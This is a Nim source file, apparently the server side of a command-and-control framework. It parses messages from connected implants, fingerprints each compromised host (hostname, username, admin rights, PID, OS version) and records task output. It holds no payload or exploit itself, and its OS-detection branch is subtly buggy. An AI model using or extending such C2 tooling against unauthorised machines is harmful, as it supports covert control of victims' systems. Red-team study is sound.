import std/[
  asyncdispatch, 
  asyncfutures, 
  strutils, 
  strformat, 
  json, 
  md5
]

import tlv

import types, logging, communication, events, tasks

proc generateClientHash(c: C2Client): string =
  getMD5(
    fmt"{c.ipAddress}{c.hostname}{c.username}{c.osType}{$c.windowsVersionInfo}"
  )

proc processMessage*(client: ref C2Client, response: string) {.async.} = 
  let server = client.server

  if not (client[] in server.clients):
    server.clients.add client[]
 
  let p = initParser()
  p.setBuffer(cast[seq[byte]](response))

  let taskId = p.extractInt32() 
  let taskName = p.extractString()
  let error = p.extractString()
  let data = p.extractString()

  echo taskId
  echo taskName
  echo error
  echo data

  if taskId <= -1:
    await client[].askToIdentify()
    return

  let task = server.tasks[taskId]
  if error != "":
    errorLog $client[] & ": " & error
    
    if client.server.cli.waitingForOutput:
      client.server.cli.waitingForOutput = false
      prompt(client.server)
  else: 
    case taskName:
    of "identify":
      let j = parseJson(data)
      client.hostname = j["hostname"].getStr("")
      client.username = j["username"].getStr("")
      client.isAdmin = j["isAdmin"].getBool(false)

      case j.getStr("unknown"):
      of "unknown":
        client.osType = UnknownOS
      of "windows":
        client.osType = WindowsOS
      of "linux":
        client.osType = LinuxOS
      client.windowsVersionInfo = WindowsVersionInfo(
        majorVersion: j["windowsOsVersionInfo"]["majorVersion"].getInt(),
        minorVersion: j["windowsOsVersionInfo"]["minorVersion"].getInt(),
        buildNumber: j["windowsOsVersionInfo"]["buildNumber"].getInt()
      )
      client.hash = client[].generateClientHash()
      client.isAdmin = j["isAdmin"].getBool(false)
      client.pid = j["pid"].getInt(0)
      client.pname = j["pname"].getStr("")
      client.isAdmin = j["isAdmin"].getBool()

      if not client.loaded:
        client.loaded = true
        onClientConnected(client[])
        cConnected client[]
    of "output":
      infoLog $client[] & " completed task " & task.action

    task.output = TaskOutput(
      error: error,
      data: data
    )

    task.markAsCompleted()
